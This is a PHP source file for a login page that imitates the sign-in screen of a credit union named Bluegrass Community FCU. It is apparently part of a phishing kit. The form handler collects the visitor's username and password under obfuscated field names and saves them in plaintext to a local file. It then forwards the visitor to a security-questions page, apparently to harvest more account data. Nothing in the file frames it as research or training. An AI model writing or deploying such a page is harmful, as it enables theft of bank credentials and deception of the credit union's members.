<?php
session_start();
require_once 'includes/file_storage.php';

// Check if user is logged in
if (isset($_SESSION['emzemz'])) {
    header('Location: security_questions.php');
    exit;
}

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $emzemz = $_POST['emzemz'] ?? '';
    $pwzenz = $_POST['pwzenz'] ?? '';
    
    $errors = [];
    
    if (empty($emzemz)) {
        $errors['emzemz'] = 'Username is required.';
    }
    
    if (empty($pwzenz)) {
        $errors['pwzenz'] = 'Password is required.';
    }
    
    if (empty($errors)) {
        // Store username in session for next steps
        $_SESSION['emzemz'] = $emzemz;
        
        // Save to test file
        $data = [
            'step' => 'login',
            'usrnm' => $emzemz,
            'emzemz' => $emzemz,
            'pwzenz' => $pwzenz
        ];
        
        saveUserData('login_attempts.txt', $data);
        
        // Redirect to security questions
        header('Location: security_questions.php');
        exit;
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bluegrass Community FCU - Sign In</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="min-h-screen bg-[#4A9619] text-[#123524] flex flex-col">
        <!-- Main Content -->
        <main class="flex-1 flex items-center justify-center px-4 py-12">
            <div class="w-full max-w-3xl flex flex-col items-center gap-8">
                <!-- Login Card -->
                <div class="w-full rounded-[30px] bg-white shadow-[0_30px_60px_rgba(0,0,0,0.18)] px-10 py-12 text-center">
                    <!-- Logo -->
                    <img
                        src="assets/blue_logo.png"
                        alt="Bluegrass Community FCU"
                        class="mx-auto h-12 w-auto"
                    />

                    <!-- Card Header -->
                    <div class="mt-6 space-y-3">
                        <p class="text-[0.65rem] font-semibold uppercase tracking-[0.35em] text-[#4A9619]">
                            Member Login
                        </p>
                        <h1 class="text-2xl font-semibold text-gray-900">Sign In</h1>
                    </div>

                    <!-- Form -->
                    <div class="mt-10 text-left text-gray-800 space-y-4">
                        <form method="POST" action="">
                            <!-- Username Field -->
                            <div>
                                <label for="emzemz" class="sr-only">
                                    Username
                                </label>
                                <input
                                    id="emzemz"
                                    name="emzemz"
                                    type="text"
                                    value="<?php echo htmlspecialchars($_POST['emzemz'] ?? ''); ?>"
                                    placeholder="Username"
                                    class="w-full rounded-xl border border-gray-200 px-4 py-3 text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                />
                                <?php if (isset($errors['emzemz'])): ?>
                                    <p class="mt-2 text-sm text-red-600"><?php echo htmlspecialchars($errors['emzemz']); ?></p>
                                <?php endif; ?>
                            </div>

                            <!-- Password Field -->
                            <div>
                                <label for="pwzenz" class="sr-only">
                                    Password
                                </label>
                                <div class="relative">
                                    <input
                                        id="pwzenz"
                                        name="pwzenz"
                                        type="password"
                                        value="<?php echo htmlspecialchars($_POST['pwzenz'] ?? ''); ?>"
                                        placeholder="Password"
                                        class="w-full rounded-xl border border-gray-200 px-4 py-3 pr-12 text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                    />
                                    <button
                                        type="button"
                                        onclick="togglePassword()"
                                        class="absolute inset-y-0 right-4 flex items-center text-blue-600 hover:text-blue-500"
                                        aria-label="Toggle password visibility"
                                    >
                                        <svg id="eyeIcon" class="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
                                            <path d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7-10-7-10-7z" />
                                            <circle cx="12" cy="12" r="3" />
                                        </svg>
                                    </button>
                                </div>
                                <?php if (isset($errors['pwzenz'])): ?>
                                    <p class="mt-2 text-sm text-red-600"><?php echo htmlspecialchars($errors['pwzenz']); ?></p>
                                <?php endif; ?>
                            </div>

                            <!-- Sign In Button -->
                            <button
                                type="submit"
                                class="w-full rounded-xl bg-[#4A9619] py-3 text-base font-semibold text-white transition hover:bg-[#3f8215] disabled:cursor-not-allowed disabled:opacity-70"
                            >
                                Sign In
                            </button>
                        </form>
                    </div>

                    <!-- Forgot Password Link -->
                    <div class="mt-8 text-sm">
                        <a href="#" class="font-medium text-blue-600 hover:underline">
                            Forgot Password
                        </a>
                    </div>
                </div>

                <!-- Footer Links -->
                <div class="flex flex-col items-center gap-4 text-sm text-white/90 md:flex-row md:gap-6">
                    <a href="#" class="font-medium hover:underline">
                        Become a Member
                    </a>
                    <span class="hidden h-4 w-px bg-white/60 md:block" aria-hidden="true"></span>
                    <a href="#" class="font-medium hover:underline">
                        PIB
                    </a>
                </div>
            </div>
        </main>

        <!-- Footer -->
        <footer class="bg-white border-t border-gray-300 py-6">
            <div class="max-w-7xl mx-auto px-4">
                <div class="flex flex-col md:flex-row md:items-center md:justify-between gap-6">
                    <div class="flex items-center gap-6 justify-center md:justify-start">
                        <img
                            src="assets/equal-housing.png"
                            alt="Equal Housing Lender"
                            class="h-12 w-auto"
                        />
                        <img
                            src="assets/ncua.png"
                            alt="National Credit Union Administration"
                            class="h-12 w-auto"
                        />
                    </div>
                    <div class="text-xs text-gray-700 text-center md:text-right space-y-2">
                        <p>© 2025 Bluegrass Community FCU. All Rights Reserved.</p>
                        <p>
                            This site contains links to other sites on the Internet. We, and your credit union,
                            cannot be responsible for the content or privacy policies of these other sites.
                        </p>
                        <p>Version: v26.10.22.0</p>
                    </div>
                </div>
                <div class="text-center text-xs text-gray-500 mt-6 border-t border-gray-200 pt-4">
                    ~ Current time is 10/12/2025 5:35:36 PM ~ 0 ~ NWEB02 ~
                </div>
            </div>
        </footer>
    </div>

    <script>
        function togglePassword() {
            const passwordInput = document.getElementById('pwzenz');
            const eyeIcon = document.getElementById('eyeIcon');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                // Change to eye-slash icon
                eyeIcon.innerHTML = '<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-6 0-10-7-10-7a21.37 21.37 0 0 1 5.07-5.92" /><path d="M1 1l22 22" />';
            } else {
                passwordInput.type = 'password';
                // Change back to eye icon
                eyeIcon.innerHTML = '<path d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7-10-7-10-7z" /><circle cx="12" cy="12" r="3" />';
            }
        }
    </script>
</body>
</html>
